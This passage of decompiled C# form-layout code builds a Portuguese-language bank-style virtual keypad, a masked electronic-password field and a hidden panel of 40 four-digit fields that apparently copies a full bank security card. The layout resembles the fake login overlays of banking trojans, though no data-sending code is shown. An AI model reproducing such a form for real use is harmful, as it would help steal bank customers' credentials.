		((Control)PanelTeclado).set_Location(new Point(10, 85));
		((Control)PanelTeclado).set_Name("PanelTeclado");
		((Control)PanelTeclado).set_Size(new Size(509, 293));
		((Control)PanelTeclado).set_TabIndex(0);
		((Control)PanelTeclado).add_Paint(new PaintEventHandler(PanelTeclado_Paint));
		((Control)botaook).set_BackColor(Color.Transparent);
		((Control)botaook).set_Cursor(Cursors.get_Hand());
		((Control)botaook).set_Location(new Point(280, 214));
		((Control)botaook).set_Name("botaook");
		((Control)botaook).set_Size(new Size(39, 16));
		((Control)botaook).set_TabIndex(15);
		((Control)botaook).add_Click((EventHandler)botaook_Click);
		((Control)teclado2).set_AutoSize(true);
		((Control)teclado2).set_Font(new Font("Arial", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)teclado2).set_ForeColor(Color.FromArgb(64, 64, 64));
		((Control)teclado2).set_Location(new Point(94, 127));
		((Control)teclado2).set_Margin(new Padding(0));
		((Control)teclado2).set_Name("teclado2");
		((Control)teclado2).set_Size(new Size(306, 15));
		((Control)teclado2).set_TabIndex(14);
		((Control)teclado2).set_Text("0 ou 3           6 ou 9           1 ou 2           5 ou 8          4 ou 7");
		((Control)teclado2).set_Visible(false);
		((Control)teclado1).set_AutoSize(true);
		((Control)teclado1).set_Font(new Font("Arial", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)teclado1).set_ForeColor(Color.FromArgb(64, 64, 64));
		((Control)teclado1).set_Location(new Point(96, 127));
		((Control)teclado1).set_Margin(new Padding(0));
		((Control)teclado1).set_Name("teclado1");
		((Control)teclado1).set_Size(new Size(306, 15));
		((Control)teclado1).set_TabIndex(13);
		((Control)teclado1).set_Text("0 ou 8           2 ou 7           5 ou 6           1 ou 9          3 ou 4");
		((Control)p_eletronica).set_BackColor(Color.White);
		((TextBoxBase)p_eletronica).set_BorderStyle((BorderStyle)0);
		((Control)p_eletronica).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)p_eletronica).set_Location(new Point(207, 97));
		((TextBoxBase)p_eletronica).set_MaxLength(8);
		((Control)p_eletronica).set_Name("p_eletronica");
		p_eletronica.set_PasswordChar('•');
		((TextBoxBase)p_eletronica).set_ReadOnly(true);
		((Control)p_eletronica).set_Size(new Size(51, 14));
		((Control)p_eletronica).set_TabIndex(12);
		((TextBoxBase)p_senha).set_BorderStyle((BorderStyle)0);
		((Control)p_senha).set_Location(new Point(81, 45));
		((TextBoxBase)p_senha).set_MaxLength(50);
		((Control)p_senha).set_Name("p_senha");
		((Control)p_senha).set_Size(new Size(350, 13));
		((Control)p_senha).set_TabIndex(11);
		((Control)p_senha).set_Visible(false);
		((Control)label4).set_BackColor(Color.Transparent);
		((Control)label4).set_Cursor(Cursors.get_Hand());
		((Control)label4).set_Location(new Point(371, 146));
		((Control)label4).set_Name("label4");
		((Control)label4).set_Size(new Size(45, 44));
		((Control)label4).set_TabIndex(1);
		((Control)label4).add_Click((EventHandler)label4_Click);
		((Control)label3).set_BackColor(Color.Transparent);
		((Control)label3).set_Cursor(Cursors.get_Hand());
		((Control)label3).set_Location(new Point(302, 146));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(45, 44));
		((Control)label3).set_TabIndex(1);
		((Control)label3).add_Click((EventHandler)label3_Click);
		((Control)label2).set_BackColor(Color.Transparent);
		((Control)label2).set_Cursor(Cursors.get_Hand());
		((Control)label2).set_Location(new Point(233, 146));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(45, 44));
		((Control)label2).set_TabIndex(1);
		((Control)label2).add_Click((EventHandler)label2_Click);
		((Control)label1).set_BackColor(Color.Transparent);
		((Control)label1).set_Cursor(Cursors.get_Hand());
		((Control)label1).set_Location(new Point(163, 146));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(45, 44));
		((Control)label1).set_TabIndex(1);
		((Control)label1).add_Click((EventHandler)label1_Click);
		((Control)tec_1).set_BackColor(Color.Transparent);
		((Control)tec_1).set_Cursor(Cursors.get_Hand());
		((Control)tec_1).set_Location(new Point(93, 146));
		((Control)tec_1).set_Name("tec_1");
		((Control)tec_1).set_Size(new Size(45, 44));
		((Control)tec_1).set_TabIndex(0);
		((Control)tec_1).add_Click((EventHandler)tec_1_Click);
		((Control)Painel_Chave).set_BackgroundImage((Image)componentResourceManager.GetObject("Painel_Chave.BackgroundImage"));
		((Control)Painel_Chave).set_BackgroundImageLayout((ImageLayout)0);
		((Control)Painel_Chave).get_Controls().Add((Control)(object)t40);
		((Control)Painel_Chave).get_Controls().Add((Control)(object)t1);
		((Control)Painel_Chave).get_Controls().Add((Control)(object)t39);
		((Control)Painel_Chave).get_Controls().Add((Control)(object)t38);
		((Control)Painel_Chave).get_Controls().Add((Control)(object)t10);
		((Control)Painel_Chave).get_Controls().Add((Control)(object)t37);
		((Control)Painel_Chave).get_Controls().Add((Control)(object)t11);
		((Control)Painel_Chave).get_Controls().Add((Control)(object)t36);
		((Control)Painel_Chave).get_Controls().Add((Control)(object)t2);
		((Control)Painel_Chave).get_Controls().Add((Control)(object)t34);
		((Control)Painel_Chave).get_Controls().Add((Control)(object)t21);
		((Control)Painel_Chave).get_Controls().Add((Control)(object)t35);
		((Control)Painel_Chave).get_Controls().Add((Control)(object)t12);
		((Control)Painel_Chave).get_Controls().Add((Control)(object)t33);
		((Control)Painel_Chave).get_Controls().Add((Control)(object)t31);
		((Control)Painel_Chave).get_Controls().Add((Control)(object)t9);
		((Control)Painel_Chave).get_Controls().Add((Control)(object)t32);
		((Control)Painel_Chave).get_Controls().Add((Control)(object)t22);
		((Control)Painel_Chave).get_Controls().Add((Control)(object)t13);
		((Control)Painel_Chave).get_Controls().Add((Control)(object)t23);
		((Control)Painel_Chave).get_Controls().Add((Control)(object)t3);
		((Control)Painel_Chave).get_Controls().Add((Control)(object)t25);
		((Control)Painel_Chave).get_Controls().Add((Control)(object)t15);
		((Control)Painel_Chave).get_Controls().Add((Control)(object)t24);
		((Control)Painel_Chave).get_Controls().Add((Control)(object)t8);
		((Control)Painel_Chave).get_Controls().Add((Control)(object)t14);
		((Control)Painel_Chave).get_Controls().Add((Control)(object)t26);
		((Control)Painel_Chave).get_Controls().Add((Control)(object)t4);
		((Control)Painel_Chave).get_Controls().Add((Control)(object)t27);
		((Control)Painel_Chave).get_Controls().Add((Control)(object)t16);
		((Control)Painel_Chave).get_Controls().Add((Control)(object)t28);
		((Control)Painel_Chave).get_Controls().Add((Control)(object)t29);
		((Control)Painel_Chave).get_Controls().Add((Control)(object)t7);
		((Control)Painel_Chave).get_Controls().Add((Control)(object)t17);
		((Control)Painel_Chave).get_Controls().Add((Control)(object)t30);
		((Control)Painel_Chave).get_Controls().Add((Control)(object)t5);
		((Control)Painel_Chave).get_Controls().Add((Control)(object)t6);
		((Control)Painel_Chave).get_Controls().Add((Control)(object)t18);
		((Control)Painel_Chave).get_Controls().Add((Control)(object)t20);
		((Control)Painel_Chave).get_Controls().Add((Control)(object)t19);
		((Control)Painel_Chave).get_Controls().Add((Control)(object)pictureBox1);
		((Control)Painel_Chave).set_Location(new Point(10, 88));
		((Control)Painel_Chave).set_Name("Painel_Chave");
		((Control)Painel_Chave).set_Size(new Size(509, 307));
		((Control)Painel_Chave).set_TabIndex(9);
		((Control)Painel_Chave).set_Visible(false);
		((TextBoxBase)t40).set_BorderStyle((BorderStyle)0);
		((Control)t40).set_Font(new Font("Verdana", 7f));
		((Control)t40).set_ForeColor(Color.FromArgb(64, 64, 64));
		((Control)t40).set_Location(new Point(361, 221));
		((Control)t40).set_Margin(new Padding(0));
		((TextBoxBase)t40).set_MaxLength(4);
		((Control)t40).set_Name("t40");
		((Control)t40).set_Size(new Size(37, 12));
		((Control)t40).set_TabIndex(39);
		t40.set_TextAlign((HorizontalAlignment)2);
		((Control)t40).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((TextBoxBase)t1).set_BorderStyle((BorderStyle)0);
		((Control)t1).set_Font(new Font("Verdana", 7f));
		((Control)t1).set_ForeColor(Color.FromArgb(64, 64, 64));
		((Control)t1).set_Location(new Point(79, 59));
		((Control)t1).set_Margin(new Padding(0));
		((TextBoxBase)t1).set_MaxLength(4);
		((Control)t1).set_Name("t1");
		((Control)t1).set_Size(new Size(37, 12));
		((Control)t1).set_TabIndex(0);
		t1.set_TextAlign((HorizontalAlignment)2);
		((Control)t1).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((TextBoxBase)t39).set_BorderStyle((BorderStyle)0);
		((Control)t39).set_Font(new Font("Verdana", 7f));
		((Control)t39).set_ForeColor(Color.FromArgb(64, 64, 64));
		((Control)t39).set_Location(new Point(361, 203));
		((Control)t39).set_Margin(new Padding(0));
		((TextBoxBase)t39).set_MaxLength(4);
		((Control)t39).set_Name("t39");
		((Control)t39).set_Size(new Size(37, 12));
		((Control)t39).set_TabIndex(38);
		t39.set_TextAlign((HorizontalAlignment)2);
		((Control)t39).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((TextBoxBase)t38).set_BorderStyle((BorderStyle)0);
		((Control)t38).set_Font(new Font("Verdana", 7f));
		((Control)t38).set_ForeColor(Color.FromArgb(64, 64, 64));
		((Control)t38).set_Location(new Point(361, 185));
		((Control)t38).set_Margin(new Padding(0));
		((TextBoxBase)t38).set_MaxLength(4);
		((Control)t38).set_Name("t38");
		((Control)t38).set_Size(new Size(37, 12));
		((Control)t38).set_TabIndex(37);
		t38.set_TextAlign((HorizontalAlignment)2);
		((Control)t38).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((TextBoxBase)t10).set_BorderStyle((BorderStyle)0);
		((Control)t10).set_Font(new Font("Verdana", 7f));
		((Control)t10).set_ForeColor(Color.FromArgb(64, 64, 64));
		((Control)t10).set_Location(new Point(79, 221));
		((Control)t10).set_Margin(new Padding(0));
		((TextBoxBase)t10).set_MaxLength(4);
		((Control)t10).set_Name("t10");
		((Control)t10).set_Size(new Size(37, 12));
		((Control)t10).set_TabIndex(9);
		t10.set_TextAlign((HorizontalAlignment)2);
		((Control)t10).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((TextBoxBase)t37).set_BorderStyle((BorderStyle)0);
		((Control)t37).set_Font(new Font("Verdana", 7f));
		((Control)t37).set_ForeColor(Color.FromArgb(64, 64, 64));
		((Control)t37).set_Location(new Point(361, 167));
		((Control)t37).set_Margin(new Padding(0));
		((TextBoxBase)t37).set_MaxLength(4);
		((Control)t37).set_Name("t37");
		((Control)t37).set_Size(new Size(37, 12));
		((Control)t37).set_TabIndex(36);
		t37.set_TextAlign((HorizontalAlignment)2);
		((Control)t37).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((TextBoxBase)t11).set_BorderStyle((BorderStyle)0);
		((Control)t11).set_Font(new Font("Verdana", 7f));
		((Control)t11).set_ForeColor(Color.FromArgb(64, 64, 64));
		((Control)t11).set_Location(new Point(173, 59));
		((Control)t11).set_Margin(new Padding(0));
		((TextBoxBase)t11).set_MaxLength(4);
		((Control)t11).set_Name("t11");
		((Control)t11).set_Size(new Size(37, 12));
		((Control)t11).set_TabIndex(10);
		t11.set_TextAlign((HorizontalAlignment)2);
		((Control)t11).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((TextBoxBase)t36).set_BorderStyle((BorderStyle)0);
		((Control)t36).set_Font(new Font("Verdana", 7f));
		((Control)t36).set_ForeColor(Color.FromArgb(64, 64, 64));
		((Control)t36).set_Location(new Point(361, 149));
		((Control)t36).set_Margin(new Padding(0));
		((TextBoxBase)t36).set_MaxLength(4);
		((Control)t36).set_Name("t36");
		((Control)t36).set_Size(new Size(37, 12));
		((Control)t36).set_TabIndex(35);
		t36.set_TextAlign((HorizontalAlignment)2);
		((Control)t36).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((TextBoxBase)t2).set_BorderStyle((BorderStyle)0);
		((Control)t2).set_Font(new Font("Verdana", 7f));
		((Control)t2).set_ForeColor(Color.FromArgb(64, 64, 64));
		((Control)t2).set_Location(new Point(79, 77));
		((Control)t2).set_Margin(new Padding(0));
		((TextBoxBase)t2).set_MaxLength(4);
		((Control)t2).set_Name("t2");
		((Control)t2).set_Size(new Size(37, 12));
		((Control)t2).set_TabIndex(1);
		t2.set_TextAlign((HorizontalAlignment)2);
		((Control)t2).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((TextBoxBase)t34).set_BorderStyle((BorderStyle)0);
		((Control)t34).set_Font(new Font("Verdana", 7f));
		((Control)t34).set_ForeColor(Color.FromArgb(64, 64, 64));
		((Control)t34).set_Location(new Point(361, 113));
		((Control)t34).set_Margin(new Padding(0));
		((TextBoxBase)t34).set_MaxLength(4);
		((Control)t34).set_Name("t34");
		((Control)t34).set_Size(new Size(37, 12));
		((Control)t34).set_TabIndex(33);
		t34.set_TextAlign((HorizontalAlignment)2);
		((Control)t34).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((TextBoxBase)t21).set_BorderStyle((BorderStyle)0);
		((Control)t21).set_Font(new Font("Verdana", 7f));
		((Control)t21).set_ForeColor(Color.FromArgb(64, 64, 64));
		((Control)t21).set_Location(new Point(266, 59));
		((Control)t21).set_Margin(new Padding(0));
		((TextBoxBase)t21).set_MaxLength(4);
		((Control)t21).set_Name("t21");
		((Control)t21).set_Size(new Size(37, 12));
		((Control)t21).set_TabIndex(20);
		t21.set_TextAlign((HorizontalAlignment)2);
		((Control)t21).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((TextBoxBase)t35).set_BorderStyle((BorderStyle)0);
		((Control)t35).set_Font(new Font("Verdana", 7f));
		((Control)t35).set_ForeColor(Color.FromArgb(64, 64, 64));
		((Control)t35).set_Location(new Point(361, 131));
		((Control)t35).set_Margin(new Padding(0));
		((TextBoxBase)t35).set_MaxLength(4);
		((Control)t35).set_Name("t35");
		((Control)t35).set_Size(new Size(37, 12));
		((Control)t35).set_TabIndex(34);
		t35.set_TextAlign((HorizontalAlignment)2);
		((Control)t35).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((TextBoxBase)t12).set_BorderStyle((BorderStyle)0);
		((Control)t12).set_Font(new Font("Verdana", 7f));
		((Control)t12).set_ForeColor(Color.FromArgb(64, 64, 64));
		((Control)t12).set_Location(new Point(173, 77));
		((Control)t12).set_Margin(new Padding(0));
		((TextBoxBase)t12).set_MaxLength(4);
		((Control)t12).set_Name("t12");
		((Control)t12).set_Size(new Size(37, 12));
		((Control)t12).set_TabIndex(11);
		t12.set_TextAlign((HorizontalAlignment)2);
		((Control)t12).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((TextBoxBase)t33).set_BorderStyle((BorderStyle)0);
		((Control)t33).set_Font(new Font("Verdana", 7f));
		((Control)t33).set_ForeColor(Color.FromArgb(64, 64, 64));
		((Control)t33).set_Location(new Point(361, 95));
		((Control)t33).set_Margin(new Padding(0));
		((TextBoxBase)t33).set_MaxLength(4);
		((Control)t33).set_Name("t33");
		((Control)t33).set_Size(new Size(37, 12));
		((Control)t33).set_TabIndex(32);
		t33.set_TextAlign((HorizontalAlignment)2);
		((Control)t33).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((TextBoxBase)t31).set_BorderStyle((BorderStyle)0);
		((Control)t31).set_Font(new Font("Verdana", 7f));
		((Control)t31).set_ForeColor(Color.FromArgb(64, 64, 64));
		((Control)t31).set_Location(new Point(361, 59));
		((Control)t31).set_Margin(new Padding(0));
		((TextBoxBase)t31).set_MaxLength(4);
		((Control)t31).set_Name("t31");
		((Control)t31).set_Size(new Size(37, 12));
		((Control)t31).set_TabIndex(30);
		t31.set_TextAlign((HorizontalAlignment)2);
		((Control)t31).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((TextBoxBase)t9).set_BorderStyle((BorderStyle)0);
		((Control)t9).set_Font(new Font("Verdana", 7f));
		((Control)t9).set_ForeColor(Color.FromArgb(64, 64, 64));
		((Control)t9).set_Location(new Point(79, 203));
		((Control)t9).set_Margin(new Padding(0));
		((TextBoxBase)t9).set_MaxLength(4);
		((Control)t9).set_Name("t9");
		((Control)t9).set_Size(new Size(37, 12));
		((Control)t9).set_TabIndex(8);
		t9.set_TextAlign((HorizontalAlignment)2);
		((Control)t9).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((TextBoxBase)t32).set_BorderStyle((BorderStyle)0);
		((Control)t32).set_Font(new Font("Verdana", 7f));
		((Control)t32).set_ForeColor(Color.FromArgb(64, 64, 64));
		((Control)t32).set_Location(new Point(361, 77));
		((Control)t32).set_Margin(new Padding(0));
		((TextBoxBase)t32).set_MaxLength(4);
		((Control)t32).set_Name("t32");
		((Control)t32).set_Size(new Size(37, 12));
		((Control)t32).set_TabIndex(31);
		t32.set_TextAlign((HorizontalAlignment)2);
		((Control)t32).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((TextBoxBase)t22).set_BorderStyle((BorderStyle)0);
		((Control)t22).set_Font(new Font("Verdana", 7f));
		((Control)t22).set_ForeColor(Color.FromArgb(64, 64, 64));
		((Control)t22).set_Location(new Point(266, 77));
		((Control)t22).set_Margin(new Padding(0));
		((TextBoxBase)t22).set_MaxLength(4);
		((Control)t22).set_Name("t22");
		((Control)t22).set_Size(new Size(37, 12));
		((Control)t22).set_TabIndex(21);
		t22.set_TextAlign((HorizontalAlignment)2);
		((Control)t22).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((TextBoxBase)t13).set_BorderStyle((BorderStyle)0);
		((Control)t13).set_Font(new Font("Verdana", 7f));
		((Control)t13).set_ForeColor(Color.FromArgb(64, 64, 64));
		((Control)t13).set_Location(new Point(173, 95));
		((Control)t13).set_Margin(new Padding(0));
		((TextBoxBase)t13).set_MaxLength(4);
		((Control)t13).set_Name("t13");
		((Control)t13).set_Size(new Size(37, 12));
		((Control)t13).set_TabIndex(12);
		t13.set_TextAlign((HorizontalAlignment)2);
		((Control)t13).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((TextBoxBase)t23).set_BorderStyle((BorderStyle)0);
		((Control)t23).set_Font(new Font("Verdana", 7f));
		((Control)t23).set_ForeColor(Color.FromArgb(64, 64, 64));
		((Control)t23).set_Location(new Point(266, 95));
		((Control)t23).set_Margin(new Padding(0));
		((TextBoxBase)t23).set_MaxLength(4);
		((Control)t23).set_Name("t23");
		((Control)t23).set_Size(new Size(37, 12));
		((Control)t23).set_TabIndex(22);
		t23.set_TextAlign((HorizontalAlignment)2);
		((Control)t23).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((TextBoxBase)t3).set_BorderStyle((BorderStyle)0);
		((Control)t3).set_Font(new Font("Verdana", 7f));
		((Control)t3).set_ForeColor(Color.FromArgb(64, 64, 64));
		((Control)t3).set_Location(new Point(79, 94));
		((Control)t3).set_Margin(new Padding(0));
		((TextBoxBase)t3).set_MaxLength(4);
		((Control)t3).set_Name("t3");
		((Control)t3).set_Size(new Size(37, 12));
		((Control)t3).set_TabIndex(2);
		t3.set_TextAlign((HorizontalAlignment)2);
		((Control)t3).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((TextBoxBase)t25).set_BorderStyle((BorderStyle)0);
		((Control)t25).set_Font(new Font("Verdana", 7f));
		((Control)t25).set_ForeColor(Color.FromArgb(64, 64, 64));
		((Control)t25).set_Location(new Point(266, 130));
		((Control)t25).set_Margin(new Padding(0));
		((TextBoxBase)t25).set_MaxLength(4);
		((Control)t25).set_Name("t25");
		((Control)t25).set_Size(new Size(37, 12));
		((Control)t25).set_TabIndex(24);
		t25.set_TextAlign((HorizontalAlignment)2);
		((Control)t25).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((TextBoxBase)t15).set_BorderStyle((BorderStyle)0);
		((Control)t15).set_Font(new Font("Verdana", 7f));
		((Control)t15).set_ForeColor(Color.FromArgb(64, 64, 64));
		((Control)t15).set_Location(new Point(173, 131));
		((Control)t15).set_Margin(new Padding(0));
		((TextBoxBase)t15).set_MaxLength(4);
		((Control)t15).set_Name("t15");
		((Control)t15).set_Size(new Size(37, 12));
		((Control)t15).set_TabIndex(14);
		t15.set_TextAlign((HorizontalAlignment)2);
		((Control)t15).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((TextBoxBase)t24).set_BorderStyle((BorderStyle)0);
		((Control)t24).set_Font(new Font("Verdana", 7f));
		((Control)t24).set_ForeColor(Color.FromArgb(64, 64, 64));
		((Control)t24).set_Location(new Point(266, 113));
		((Control)t24).set_Margin(new Padding(0));
		((TextBoxBase)t24).set_MaxLength(4);
		((Control)t24).set_Name("t24");
		((Control)t24).set_Size(new Size(37, 12));
		((Control)t24).set_TabIndex(23);
		t24.set_TextAlign((HorizontalAlignment)2);
		((Control)t24).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((TextBoxBase)t8).set_BorderStyle((BorderStyle)0);
		((Control)t8).set_Font(new Font("Verdana", 7f));
		((Control)t8).set_ForeColor(Color.FromArgb(64, 64, 64));
		((Control)t8).set_Location(new Point(79, 185));
		((Control)t8).set_Margin(new Padding(0));
		((TextBoxBase)t8).set_MaxLength(4);
		((Control)t8).set_Name("t8");
		((Control)t8).set_Size(new Size(37, 12));
		((Control)t8).set_TabIndex(7);
		t8.set_TextAlign((HorizontalAlignment)2);
		((Control)t8).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((TextBoxBase)t14).set_BorderStyle((BorderStyle)0);
		((Control)t14).set_Font(new Font("Verdana", 7f));
		((Control)t14).set_ForeColor(Color.FromArgb(64, 64, 64));
		((Control)t14).set_Location(new Point(173, 113));
		((Control)t14).set_Margin(new Padding(0));
		((TextBoxBase)t14).set_MaxLength(4);
		((Control)t14).set_Name("t14");
		((Control)t14).set_Size(new Size(37, 12));
		((Control)t14).set_TabIndex(13);
		t14.set_TextAlign((HorizontalAlignment)2);
		((Control)t14).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((TextBoxBase)t26).set_BorderStyle((BorderStyle)0);
		((Control)t26).set_Font(new Font("Verdana", 7f));
		((Control)t26).set_ForeColor(Color.FromArgb(64, 64, 64));
		((Control)t26).set_Location(new Point(266, 149));
		((Control)t26).set_Margin(new Padding(0));
		((TextBoxBase)t26).set_MaxLength(4);
		((Control)t26).set_Name("t26");
		((Control)t26).set_Size(new Size(37, 12));
		((Control)t26).set_TabIndex(25);
		t26.set_TextAlign((HorizontalAlignment)2);
		((Control)t26).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((TextBoxBase)t4).set_BorderStyle((BorderStyle)0);
		((Control)t4).set_Font(new Font("Verdana", 7f));
		((Control)t4).set_ForeColor(Color.FromArgb(64, 64, 64));
		((Control)t4).set_Location(new Point(79, 113));
		((Control)t4).set_Margin(new Padding(0));
		((TextBoxBase)t4).set_MaxLength(4);
		((Control)t4).set_Name("t4");
		((Control)t4).set_Size(new Size(37, 12));
		((Control)t4).set_TabIndex(3);
		t4.set_TextAlign((HorizontalAlignment)2);
		((Control)t4).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((TextBoxBase)t27).set_BorderStyle((BorderStyle)0);
		((Control)t27).set_Font(new Font("Verdana", 7f));
		((Control)t27).set_ForeColor(Color.FromArgb(64, 64, 64));
		((Control)t27).set_Location(new Point(266, 167));
		((Control)t27).set_Margin(new Padding(0));
		((TextBoxBase)t27).set_MaxLength(4);
		((Control)t27).set_Name("t27");
		((Control)t27).set_Size(new Size(37, 12));
		((Control)t27).set_TabIndex(26);
		t27.set_TextAlign((HorizontalAlignment)2);
		((Control)t27).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((TextBoxBase)t16).set_BorderStyle((BorderStyle)0);
		((Control)t16).set_Font(new Font("Verdana", 7f));
		((Control)t16).set_ForeColor(Color.FromArgb(64, 64, 64));
		((Control)t16).set_Location(new Point(173, 149));
		((Control)t16).set_Margin(new Padding(0));
		((TextBoxBase)t16).set_MaxLength(4);
		((Control)t16).set_Name("t16");
		((Control)t16).set_Size(new Size(37, 12));
		((Control)t16).set_TabIndex(15);
		t16.set_TextAlign((HorizontalAlignment)2);
		((Control)t16).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((TextBoxBase)t28).set_BorderStyle((BorderStyle)0);
		((Control)t28).set_Font(new Font("Verdana", 7f));
		((Control)t28).set_ForeColor(Color.FromArgb(64, 64, 64));
		((Control)t28).set_Location(new Point(266, 185));
		((Control)t28).set_Margin(new Padding(0));
		((TextBoxBase)t28).set_MaxLength(4);
		((Control)t28).set_Name("t28");
		((Control)t28).set_Size(new Size(37, 12));
		((Control)t28).set_TabIndex(27);
		t28.set_TextAlign((HorizontalAlignment)2);
		((Control)t28).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((TextBoxBase)t29).set_BorderStyle((BorderStyle)0);
		((Control)t29).set_Font(new Font("Verdana", 7f));
		((Control)t29).set_ForeColor(Color.FromArgb(64, 64, 64));
		((Control)t29).set_Location(new Point(266, 203));
		((Control)t29).set_Margin(new Padding(0));
		((TextBoxBase)t29).set_MaxLength(4);
		((Control)t29).set_Name("t29");
		((Control)t29).set_Size(new Size(37, 12));
		((Control)t29).set_TabIndex(28);
		t29.set_TextAlign((HorizontalAlignment)2);
		((Control)t29).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((TextBoxBase)t7).set_BorderStyle((BorderStyle)0);
		((Control)t7).set_Font(new Font("Verdana", 7f));
		((Control)t7).set_ForeColor(Color.FromArgb(64, 64, 64));
		((Control)t7).set_Location(new Point(79, 166));
		((Control)t7).set_Margin(new Padding(0));
		((TextBoxBase)t7).set_MaxLength(4);
		((Control)t7).set_Name("t7");
		((Control)t7).set_Size(new Size(37, 12));
		((Control)t7).set_TabIndex(6);
		t7.set_TextAlign((HorizontalAlignment)2);
		((Control)t7).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((TextBoxBase)t17).set_BorderStyle((BorderStyle)0);
		((Control)t17).set_Font(new Font("Verdana", 7f));
		((Control)t17).set_ForeColor(Color.FromArgb(64, 64, 64));
		((Control)t17).set_Location(new Point(173, 167));
		((Control)t17).set_Margin(new Padding(0));
		((TextBoxBase)t17).set_MaxLength(4);
		((Control)t17).set_Name("t17");
		((Control)t17).set_Size(new Size(37, 12));
		((Control)t17).set_TabIndex(16);
		t17.set_TextAlign((HorizontalAlignment)2);
		((Control)t17).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((TextBoxBase)t30).set_BorderStyle((BorderStyle)0);
		((Control)t30).set_Font(new Font("Verdana", 7f));
		((Control)t30).set_ForeColor(Color.FromArgb(64, 64, 64));
		((Control)t30).set_Location(new Point(266, 221));
		((Control)t30).set_Margin(new Padding(0));
		((TextBoxBase)t30).set_MaxLength(4);
		((Control)t30).set_Name("t30");
		((Control)t30).set_Size(new Size(37, 12));
		((Control)t30).set_TabIndex(29);
		t30.set_TextAlign((HorizontalAlignment)2);
		((Control)t30).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((TextBoxBase)t5).set_BorderStyle((BorderStyle)0);
		((Control)t5).set_Font(new Font("Verdana", 7f));
		((Control)t5).set_ForeColor(Color.FromArgb(64, 64, 64));
		((Control)t5).set_Location(new Point(79, 131));
		((Control)t5).set_Margin(new Padding(0));
		((TextBoxBase)t5).set_MaxLength(4);
		((Control)t5).set_Name("t5");
		((Control)t5).set_Size(new Size(37, 12));
		((Control)t5).set_TabIndex(4);
		t5.set_TextAlign((HorizontalAlignment)2);
		((Control)t5).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((TextBoxBase)t6).set_BorderStyle((BorderStyle)0);
		((Control)t6).set_Font(new Font("Verdana", 7f));
		((Control)t6).set_ForeColor(Color.FromArgb(64, 64, 64));
		((Control)t6).set_Location(new Point(79, 148));
		((Control)t6).set_Margin(new Padding(0));
		((TextBoxBase)t6).set_MaxLength(4);
		((Control)t6).set_Name("t6");
		((Control)t6).set_Size(new Size(37, 12));
		((Control)t6).set_TabIndex(5);
		t6.set_TextAlign((HorizontalAlignment)2);
		((Control)t6).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((TextBoxBase)t18).set_BorderStyle((BorderStyle)0);
		((Control)t18).set_Font(new Font("Verdana", 7f));
		((Control)t18).set_ForeColor(Color.FromArgb(64, 64, 64));
		((Control)t18).set_Location(new Point(173, 185));
		((Control)t18).set_Margin(new Padding(0));
		((TextBoxBase)t18).set_MaxLength(4);
		((Control)t18).set_Name("t18");
		((Control)t18).set_Size(new Size(37, 12));
		((Control)t18).set_TabIndex(17);
		t18.set_TextAlign((HorizontalAlignment)2);
		((Control)t18).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((TextBoxBase)t20).set_BorderStyle((BorderStyle)0);
		((Control)t20).set_Font(new Font("Verdana", 7f));
		((Control)t20).set_ForeColor(Color.FromArgb(64, 64, 64));
		((Control)t20).set_Location(new Point(173, 221));
		((Control)t20).set_Margin(new Padding(0));
		((TextBoxBase)t20).set_MaxLength(4);
		((Control)t20).set_Name("t20");
		((Control)t20).set_Size(new Size(37, 12));
		((Control)t20).set_TabIndex(19);
		t20.set_TextAlign((HorizontalAlignment)2);
		((Control)t20).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetra));
		((TextBoxBase)t19).set_BorderStyle((BorderStyle)0);
		((Control)t19).set_Font(new Font("Verdana", 7f));
